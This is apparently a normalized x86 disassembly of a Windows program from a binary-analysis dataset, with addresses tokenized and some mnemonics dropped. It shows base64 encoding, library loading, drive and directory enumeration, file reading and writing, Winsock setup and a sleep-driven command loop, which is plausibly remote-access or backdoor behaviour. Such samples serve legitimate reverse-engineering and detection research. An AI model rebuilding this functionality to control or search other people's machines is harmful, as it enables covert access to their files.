sub_401000
push ebp
mov ebp [ esp + 0x10 ]
cmp ebp 0x3
push esi
jl r-xdata
mov esi [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov eax 0xaaaaaaab
push edi
mul ebp
mov edi edx
mov esi [ esp + 0x14 ]
shr edi 0x1
lea eax [ edi * 4 ]
sub eax edi
neg eax
add ebp eax
mov eax [ esp + 0x10 ]
pop esi
mov [ eax ] 0x0
pop ebp
retn
xor ecx ecx
mov cl [ esi ]
shr ecx 0x2
inc eax
mov dl [ ecx + r--data ]
mov [ eax - 0x1 ] dl
mov cl [ esi ]
and cl 0x3
shl cl 0x4
cmp ebp 0x1
mov [ esp + 0x10 ] cl
jle r-xdata
xor ecx ecx
mov cl [ esi ]
add esi 0x3
shr ecx 0x2
inc eax
mov dl [ ecx + r--data ]
mov [ eax - 0x1 ] dl
mov cl [ esi - 0x3 ]
xor edx edx
and ecx 0x3
mov dl [ esi - 0x2 ]
shl ecx 0x4
shr edx 0x4
or ecx edx
inc eax
mov cl [ ecx + r--data ]
mov [ eax - 0x1 ] cl
mov dl [ esi - 0x2 ]
xor ecx ecx
and edx 0xf
mov cl [ esi - 0x1 ]
shl edx 0x2
shr ecx 0x6
or edx ecx
inc eax
mov dl [ edx + r--data ]
mov [ eax - 0x1 ] dl
mov cl [ esi - 0x1 ]
and ecx 0x3f
inc eax
dec edi
mov dl [ ecx + r--data ]
mov [ eax - 0x1 ] dl
jne r-xdata
pop edi
jmp r-xdata
mov ecx [ esp + 0x10 ]
and ecx 0xff
inc eax
cmp ebp 0x2
mov dl [ ecx + r--data ]
mov [ eax - 0x1 ] dl
jge r-xdata
mov dl [ esi + 0x1 ]
shr dl 0x4
or cl dl
mov [ esp + 0x10 ] cl
test ebp ebp
jle r-xdata
mov cl [ esi + 0x1 ]
pop esi
and ecx 0xf
inc eax
pop ebp
mov cl [ ecx * 4 + r--data ]
mov [ eax - 0x1 ] cl
mov [ eax ] 0x3d
mov [ eax + 0x1 ] 0x0
retn
mov cl 0x3d
pop esi
mov [ eax ] cl
inc eax
pop ebp
mov [ eax ] cl
mov [ eax + 0x1 ] 0x0
retn
sub_401120
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
push esi
call sub_401000
mov cl [ esi ]
add esp 0xc
mov eax esi
test cl cl
pop esi
je r-xdata
retn
cmp [ eax ] 0x2b
jne r-xdata
cmp [ eax ] 0x2f
jne r-xdata
mov [ eax ] 0x2d
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov [ eax ] 0x5f
sub_401160
push 0xffffffff
push sub_41033b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x134
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x31 ]
mov [ esp + 0x30 ] 0x0
push 0x104
[ edi ]
lea eax [ esp + 0x34 ]
push eax
push rw-data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
push esi
lea edx [ esp + 0x38 ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x38 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ LoadLibraryA@IAT ]
lea ecx [ esp + 0xc ]
call sub_401c00
lea ecx [ esp + 0xc ]
mov [ esp + 0x148 ] 0x0
call sub_401d50
pop edi
mov ecx [ esp + 0x134 ]
mov [ fs : 0x0 ] ecx
add esp 0x140
retn 0x4
sub_4012a0
push 0xffffffff
push sub_410363
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x9c
push ebx
push ebp
push esi
push edi
push 0x2c
lea ecx [ esp + 0x18 ]
call sub_405fa0
xor ebx ebx
push 0x8003
mov [ esp + 0xb8 ] ebx
call [ SetErrorMode@IAT ]
mov edi [ wsprintfW@IAT ]
mov ebp [ GetDriveTypeW@IAT ]
mov esi 0x1
inc esi
cmp esi 0x1a
jl r-xdata
cmp eax 0x5
jg r-xdata
lea eax [ esi + 0x41 ]
and eax 0xffff
push eax
lea eax [ esp + 0x50 ]
push rw-data
push eax
call edi
add esp 0xc
lea ecx [ esp + 0x4c ]
push ecx
call ebp
cmp eax 0x2
mov [ esp + 0x48 ] ebx
mov [ esp + 0x2c ] eax
jl r-xdata
lea ecx [ esp + 0x80 ]
push 0x2c
push ecx
lea ecx [ esp + 0x1c ]
mov [ esp + 0xa4 ] 0x1
call sub_405ff0
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
push ebx
push ebx
push edx
push eax
mov eax [ esp + 0xd0 ]
push 0x1
push 0x1
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x10 ]
push ecx
push edx
lea ecx [ esp + 0x78 ]
call sub_401ad0
mov ecx [ esp + 0xbc ]
lea eax [ esp + 0x58 ]
push eax
mov [ esp + 0xb8 ] 0x1
call sub_402bd0
lea ecx [ esp + 0x58 ]
mov [ esp + 0xb4 ] bl
call sub_401bf0
lea ecx [ esp + 0x14 ]
mov [ esp + 0xb4 ] 0xffffffff
call sub_405fe0
mov ecx [ esp + 0xac ]
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xa8
retn
lea edx [ esp + 0x40 ]
lea eax [ esp + 0x38 ]
push edx
lea ecx [ esp + 0x34 ]
push eax
lea edx [ esp + 0x54 ]
push ecx
push edx
call [ GetDiskFreeSpaceExW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x2c ]
push 0x2c
push eax
lea ecx [ esp + 0x1c ]
call sub_405ff0
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x24 ]
push ecx
lea eax [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x58 ]
push eax
push ecx
call [ GetDiskFreeSpaceW@IAT ]
mov eax [ esp + 0x28 ]
mov [ esp + 0x44 ] ebx
imul eax [ esp + 0x20 ]
mov edx eax
mov [ esp + 0x3c ] ebx
imul edx [ esp + 0x24 ]
imul eax [ esp + 0x10 ]
mov [ esp + 0x40 ] edx
mov [ esp + 0x38 ] eax
sub_401440
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_410391
push eax
mov [ fs : 0x0 ] esp
sub esp 0x528
push ebx
mov ebx [ esp + 0x540 ]
push esi
push edi
mov eax [ ebx + 0x20 ]
push eax
lea eax [ esp + 0x32c ]
push eax
call sub_4088fe
lea ecx [ esp + 0x330 ]
push ecx
call sub_408923
add esp 0xc
cmp [ esp + eax * 2 + 0x326 ] 0x5c
jne r-xdata
push 0x2c
lea ecx [ esp + 0x10 ]
call sub_405fa0
lea eax [ esp + 0xd8 ]
lea ecx [ esp + 0x328 ]
xor esi esi
push eax
push ecx
mov [ esp + 0x544 ] esi
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea edx [ esp + 0x328 ]
push rw-data
push edx
call sub_4088d4
add esp 0x8
mov ebx [ FindNextFileW@IAT ]
push ebp
mov ebp [ wsprintfW@IAT ]
mov [ esp + 0x34 ] esi
lea edx [ esp + 0x30 ]
push 0x58
push edx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x38 ] 0x1
call sub_405ff0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edx [ ebx + 0xc ]
push esi
push esi
push eax
mov eax [ ebx + 0x10 ]
push ecx
push esi
push 0x1
push edx
push eax
lea ecx [ esp + 0xa8 ]
call sub_401ad0
lea ecx [ esp + 0x88 ]
mov [ esp + 0x53c ] 0x1
push ecx
mov ecx [ esp + 0x548 ]
call sub_402bd0
lea ecx [ esp + 0x88 ]
mov [ esp + 0x53c ] 0x0
call sub_401bf0
lea ecx [ esp + 0xc ]
mov [ esp + 0x53c ] edi
call sub_405fe0
xor al al
jmp r-xdata
test al 0x20
je r-xdata
mov [ esp + 0x3c ] 0x44
mov ecx [ esp + 0x534 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x534
retn
test al 0x2
je r-xdata
mov [ esp + 0x3e ] 0x41
test ah 0x8
je r-xdata
mov [ esp + 0x40 ] 0x48
test al 0x1
je r-xdata
mov [ esp + 0x42 ] 0x43
test al 0x4
je r-xdata
mov [ esp + 0x44 ] 0x52
test ah 0x1
je r-xdata
mov [ esp + 0x46 ] 0x53
mov edx [ rw-data ]
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0xf0 ]
push eax
push ecx
call [ edx + 0x127c ]
mov edx [ rw-data ]
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x2c ]
push eax
push ecx
call [ edx + 0x1280 ]
lea eax [ esp + 0x108 ]
push eax
call sub_408923
mov edx [ esp + 0x100 ]
lea ecx [ eax + eax + 0x2 ]
mov eax [ esp + 0x2a ]
mov [ esp + 0x3c ] edx
and eax 0xffff
mov [ esp + 0x8c ] ecx
cdq
mov ecx 0x3c
idiv ecx
mov eax [ esp + 0x28 ]
mov ecx 0x18
and eax 0xffff
push edx
cdq
idiv ecx
mov eax [ esp + 0x2a ]
mov ecx [ esp + 0x26 ]
and eax 0xffff
and ecx 0xffff
push edx
mov edx [ esp + 0x28 ]
and edx 0xffff
push edx
push eax
push ecx
lea edx [ esp + 0x64 ]
push rw-data
push edx
call ebp
add esp 0x20
lea eax [ esp + 0x34 ]
lea ecx [ esp + 0x10 ]
push 0x58
push eax
call sub_405ff0
lea ecx [ esp + 0x108 ]
push ecx
call sub_408923
add esp 0x4
lea edx [ eax + eax + 0x2 ]
lea eax [ esp + 0x108 ]
lea ecx [ esp + 0x10 ]
push edx
push eax
call sub_405ff0
mov ecx [ esp + 0xfc ]
add esi ecx
lea ecx [ esp + 0xdc ]
push ecx
push edi
call ebx
test eax eax
jne r-xdata
mov [ esp + 0x48 ] 0x54
lea edx [ esp + 0x3c ]
push rw-data
push edx
call sub_4088fe
mov eax [ esp + 0xe4 ]
add esp 0x8
test al 0x10
je r-xdata
mov edx [ rw-data ]
push edi
call [ edx + 0x1284 ]
lea eax [ esp + 0x34 ]
push 0x58
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x3c ] 0x1
call sub_405ff0
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x54c ]
push 0x0
push 0x0
push ecx
mov ecx [ eax + 0xc ]
push edx
mov edx [ eax + 0x10 ]
push 0x0
push 0x1
push ecx
push edx
lea ecx [ esp + 0xd4 ]
call sub_401ad0
mov ecx [ esp + 0x548 ]
lea eax [ esp + 0xb4 ]
push eax
mov [ esp + 0x544 ] 0x2
call sub_402bd0
lea ecx [ esp + 0xb4 ]
mov [ esp + 0x540 ] 0x0
call sub_401bf0
lea ecx [ esp + 0x10 ]
mov [ esp + 0x540 ] 0xffffffff
call sub_405fe0
mov al 0x1
pop ebp
sub_401780
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
mov ecx [ eax + 0x20 ]
mov edi [ eax + 0x24 ]
mov ebx [ eax + 0x14 ]
push rw-data
push ecx
call sub_408ac0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push esi
push ebx
push 0x1
push edi
call sub_408996
push esi
call sub_408940
add esp 0x14
mov al 0x1
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
xor al al
pop ebx
retn
sub_4017d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4103a8
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x28
mov ecx [ eax + 0x20 ]
push ebp
push rw-data
push ecx
call sub_408ac0
mov ebp eax
add esp 0x8
test ebp ebp
jne r-xdata
push ebx
push esi
push edi
push 0x2
push 0x0
push ebp
call sub_408d67
push ebp
call sub_408c0f
push ebp
mov esi eax
call sub_408bbb
add esp 0x14
xor al al
pop ebp
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
push esi
call sub_4083df
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
xor edi edi
test esi esi
jle r-xdata
push ebp
call sub_408940
mov eax [ esp + 0x50 ]
add esp 0x4
mov ecx [ eax + 0x1c ]
mov edx [ eax + 0x24 ]
push esi
push ebx
push ecx
mov ecx [ eax + 0xc ]
push edx
mov edx [ eax + 0x10 ]
push esi
push 0x1
push ecx
push edx
lea ecx [ esp + 0x30 ]
call sub_401ad0
mov ecx [ esp + 0x48 ]
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x44 ] 0x0
call sub_402bd0
push ebx
call sub_4083b0
add esp 0x4
lea ecx [ esp + 0x10 ]
mov [ esp + 0x40 ] 0xffffffff
call sub_401bf0
mov ecx [ esp + 0x38 ]
pop edi
pop esi
pop ebx
mov al 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov edx esi
push ebp
sub edx edi
lea eax [ edi + ebx ]
push edx
push 0x1
push eax
call sub_408ad3
add edi eax
add esp 0x10
cmp edi esi
jl r-xdata
sub_4018e0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4103c8
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
sub esp 0x28
mov [ rw-data ] eax
push esi
mov esi [ esp + 0x44 ]
push edi
mov eax [ esi + 0xc ]
cmp eax 0x2
jne r-xdata
cmp eax 0x5
jne r-xdata
mov ecx [ esi + 0x20 ]
push rw-data
push ecx
call sub_408df3
add esp 0x8
test eax eax
push esi
jne r-xdata
cmp eax 0x4
jne r-xdata
mov ecx [ esp + 0x44 ]
push esi
push ecx
call sub_4017d0
add esp 0x8
pop edi
pop esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov eax [ esp + 0x48 ]
push eax
call sub_401440
add esp 0x8
pop edi
pop esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov edx [ esp + 0x48 ]
push edx
call sub_4012a0
add esp 0x8
pop edi
pop esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov ecx [ esp + 0x30 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
mov edi [ esp + 0x44 ]
push esi
push edi
call sub_401780
add esp 0x8
test al al
je r-xdata
mov edx [ esi + 0x18 ]
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x14 ]
push 0x0
push 0x0
push edx
mov edx [ esi + 0xc ]
push eax
mov eax [ esi + 0x10 ]
push ecx
push 0x1
push edx
push eax
lea ecx [ esp + 0x28 ]
call sub_401ad0
lea ecx [ esp + 0x8 ]
mov [ esp + 0x38 ] 0x0
push ecx
mov ecx edi
call sub_402bd0
lea ecx [ esp + 0x8 ]
mov [ esp + 0x38 ] 0xffffffff
call sub_401bf0
sub_401a30
mov eax 0x83a0
call sub_408e30
push esi
mov esi ecx
push edi
lea ecx [ esp + 0x8 ]
lea edi [ esi + 0x4 ]
mov [ esi ] 0x0
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x24 ] 0x0
mov [ edi ] 0x0
call sub_404fc0
mov eax [ esp + 0x83b0 ]
mov ecx [ esp + 0x83ac ]
push esi
push edi
push eax
push ecx
lea ecx [ esp + 0x18 ]
call sub_405f10
mov eax [ edi ]
mov edx [ eax + 0x1 ]
mov [ esi + 0xc ] edx
mov ecx [ eax + 0x5 ]
mov [ esi + 0x10 ] ecx
mov dl [ eax ]
mov [ esi + 0x8 ] dl
mov ecx [ eax + 0x9 ]
mov [ esi + 0x14 ] ecx
mov edx [ eax + 0xd ]
mov [ esi + 0x18 ] edx
mov ecx [ eax + 0x11 ]
mov [ esi + 0x1c ] ecx
mov ecx edx
test ecx ecx
je r-xdata
mov edx [ esi + 0x1c ]
test edx edx
je r-xdata
lea edx [ eax + 0x15 ]
mov [ esi + 0x20 ] edx
mov eax esi
pop edi
pop esi
add esp 0x83a0
retn 0x8
lea eax [ ecx + eax + 0x15 ]
mov [ esi + 0x24 ] eax
sub_401ad0
mov eax 0x83a4
call sub_408e30
mov eax [ esp + 0x83bc ]
push ebx
push ebp
mov ebp ecx
mov ecx [ esp + 0x83cc ]
push esi
push edi
xor edi edi
lea esi [ eax + ecx + 0x19 ]
mov [ ebp ] edi
push esi
mov [ ebp + 0x4 ] edi
mov [ ebp + 0x20 ] edi
mov [ ebp + 0x24 ] edi
mov [ esp + 0x14 ] esi
call sub_4083df
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x83a4
retn 0x20
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
mov dl [ esp + 0x83c0 ]
and ecx 0x3
[ edi ]
mov eax [ esp + 0x83bc ]
mov ecx [ esp + 0x83b8 ]
mov [ ebx + 0x1 ] eax
mov eax [ esp + 0x83c4 ]
mov [ ebx + 0x9 ] eax
mov eax [ esp + 0x83c8 ]
mov [ ebx + 0x5 ] ecx
mov ecx [ esp + 0x83cc ]
mov [ ebx ] dl
mov edx [ esp + 0x83d4 ]
test eax eax
mov [ ebx + 0xd ] ecx
mov [ ebx + 0x11 ] edx
je r-xdata
mov eax [ esp + 0x83d0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ecx
lea edi [ ebx + 0x15 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
call sub_404fc0
lea eax [ ebp + 0x4 ]
push ebp
push eax
push esi
push ebx
lea ecx [ esp + 0x24 ]
call sub_405ea0
mov ecx [ esp + 0x83d4 ]
mov edx [ esp + 0x83cc ]
mov esi eax
mov eax ecx
lea edi [ ebx + edx + 0x15 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x10 ]
sub_401c00
push 0xffffffff
push sub_4103fc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x198
mov al [ esp + 0x3 ]
push esi
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esi + 0x4 ] al
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov cl [ esp + 0x7 ]
mov [ esp + 0x1a4 ] eax
mov [ esi + 0x14 ] cl
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
push 0x4
push 0x3000
push 0x1a0c
push eax
mov [ esp + 0x1b4 ] 0x1
mov [ esi ] r--data
call [ VirtualAlloc@IAT ]
mov [ esi + 0x28 ] eax
mov [ eax ] 0x1a0c
mov edx [ esi + 0x28 ]
mov ecx esi
push edx
call sub_402a90
mov eax [ esi + 0x28 ]
lea ecx [ esp + 0xc ]
push ecx
push 0x101
call [ eax + 0x15e4 ]
mov ecx [ esp + 0x19c ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1a4
retn
sub_401cd0
push ebx
push esi
mov esi ecx
xor ebx ebx
mov [ esi ] r--data
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
pop esi
pop ebx
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
dec al
mov [ ecx ] al
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
pop esi
pop ebx
retn
sub_401d50
push ebp
mov ebp esp
push 0xffffffff
push sub_410475
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x458
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ebx
call sub_402980
push 0x70
call sub_408e6a
mov esi eax
add esp 0x4
mov [ ebp - 0x24 ] esi
xor edi edi
cmp esi edi
mov [ ebp - 0x4 ] edi
je r-xdata
xor esi esi
mov al [ ebp - 0x19 ]
lea ecx [ esi + 0x10 ]
push edi
mov [ ecx ] al
call sub_404100
lea ecx [ ebp - 0x19 ]
mov [ ebp - 0x4 ] 0x1
push ecx
lea ecx [ esi + 0x20 ]
call sub_404020
lea edx [ ebp - 0x2d ]
lea ecx [ esi + 0x30 ]
push edx
mov [ ebp - 0x4 ] 0x2
call sub_404020
lea eax [ ebp - 0x2f ]
lea ecx [ esi + 0x40 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_404020
lea ecx [ ebp - 0x2e ]
mov [ ebp - 0x4 ] 0x4
push ecx
lea ecx [ esi + 0x58 ]
call sub_404080
lea edx [ ebp - 0x11 ]
lea ecx [ esi + 0x64 ]
push edx
mov [ ebp - 0x4 ] 0x5
call sub_404080
mov [ esi ] r--data
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax edi
je r-xdata
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] 0x1
mov [ rw-data ] edi
jmp r-xdata
mov al [ ebp - 0x11 ]
push edi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x40 ] al
call sub_404100
mov cl [ ebp - 0x11 ]
push edi
mov [ ebp - 0x50 ] cl
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x7
call sub_404100
lea edx [ ebp - 0x50 ]
push edi
lea eax [ ebp - 0x40 ]
push edx
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x8
call sub_402410
test al al
jne r-xdata
push eax
call sub_4083b0
add esp 0x4
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x3c ]
cmp eax edi
jne r-xdata
mov ecx [ ebx + 0x28 ]
push 0x493e0
call [ ecx + 0x1394 ]
push 0x1
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x7
call sub_404100
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x6
call sub_404100
jmp r-xdata
push rw-data
push edi
push edi
push eax
mov ecx esi
call sub_4060a0
test al al
je r-xdata
mov eax r--data
mov ecx [ ebp - 0x4c ]
cmp ecx edi
je r-xdata
mov eax [ esi + 0x44 ]
cmp eax edi
jne r-xdata
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x4c ] edi
cmp ecx edi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x44 ] edi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
push edi
push edi
push edi
push edi
push eax
mov ecx esi
call sub_406700
test al al
je r-xdata
mov eax r--data
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] edi
jmp r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebx + 0x28 ]
cmp eax edi
je r-xdata
mov dx [ rw-data ]
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x462 ]
mov [ ebp - 0x464 ] dx
push 0x400
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0x464 ]
mov ecx esi
push eax
mov [ ebp - 0x28 ] 0x1
call sub_407ce0
lea edi [ ebp - 0x464 ]
or ecx 0xffffffff
xor eax eax
add ebx 0x4
[ edi ]
not ecx
dec ecx
push 0x1
mov edi ecx
mov ecx ebx
push edi
mov [ ebp - 0x24 ] edi
call sub_404170
test al al
je r-xdata
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov eax [ ebp - 0x28 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x5
push edx
call [ ecx + 0x1394 ]
mov eax [ ebp - 0x28 ]
cmp eax 0x400
jge r-xdata
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x5
push edx
call [ ecx + 0x1394 ]
mov [ rw-data ] edi
jmp r-xdata
mov ecx 0x100
xor eax eax
lea edi [ ebp - 0x464 ]
[ edi ]
mov ecx esi
call sub_407bb0
mov edi eax
xor ebx ebx
cmp edi ebx
mov [ ebp - 0x24 ] edi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov ecx edi
mov edx ecx
lea esi [ ebp - 0x464 ]
mov edi eax
mov eax edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
call sub_404150
mov esi [ ebp - 0x20 ]
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx esi
call sub_4066d0
add eax eax
mov [ ebp - 0x28 ] eax
push edi
call sub_4083df
add esp 0x4
mov ecx esi
mov [ ebp - 0x2c ] eax
push edi
push eax
call sub_407d40
cmp eax ebx
je r-xdata
push 0x1
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x7
call sub_404100
push 0x1
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x6
call sub_404100
mov ebx [ ebp - 0x18 ]
xor edi edi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
mov ecx esi
call sub_407c60
mov esi eax
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x18 ]
push 0x3e8
mov edx [ ecx + 0x28 ]
call [ edx + 0x1394 ]
mov ebx [ ebp - 0x18 ]
xor edi edi
jmp r-xdata
mov ecx esi
call sub_4066d0
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
lea eax [ eax + eax * 2 ]
mov edx [ ecx + 0x28 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
push eax
call [ edx + 0x1394 ]
mov ecx [ ebp - 0x4c ]
mov [ rw-data ] ebx
cmp ecx ebx
je r-xdata
mov esi [ ebp - 0x20 ]
mov cl [ ebp - 0x11 ]
push ebx
mov [ ebp - 0x60 ] cl
lea ecx [ ebp - 0x60 ]
call sub_404100
mov edi esi
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebx ecx
lea ecx [ ebp - 0x60 ]
push ebx
call sub_404170
test al al
je r-xdata
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x4c ] ebx
cmp ecx ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ ebp - 0x4 ] 0x9
[ edi ]
not ecx
dec ecx
xor edi edi
push ecx
mov ecx [ ebp - 0x58 ]
push rw-data
push ecx
push edi
lea ecx [ ebp - 0x60 ]
call sub_404400
cmp eax edi
jne r-xdata
mov edi [ ebp - 0x5c ]
mov ecx ebx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x58 ] ebx
mov [ eax + ebx ] 0x0
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov ebx [ ebp - 0x18 ]
xor edi edi
jmp r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x8
cmp eax edi
je r-xdata
push 0x28
call sub_408e6a
mov ecx eax
add esp 0x4
mov [ ebp - 0x64 ] ecx
cmp ecx edi
mov [ ebp - 0x4 ] 0xa
je r-xdata
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov [ ebp - 0x5c ] edi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x54 ] edi
xor ebx ebx
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
xor esi esi
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
push edx
push eax
call sub_401a30
mov esi eax
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx esi
call sub_401bf0
push esi
call sub_408e5f
add esp 0x4
mov ecx [ ebp - 0x18 ]
push esi
mov [ ebp - 0x4 ] 0x9
call sub_4029d0
cmp esi edi
je r-xdata
dec al
mov [ ecx ] al
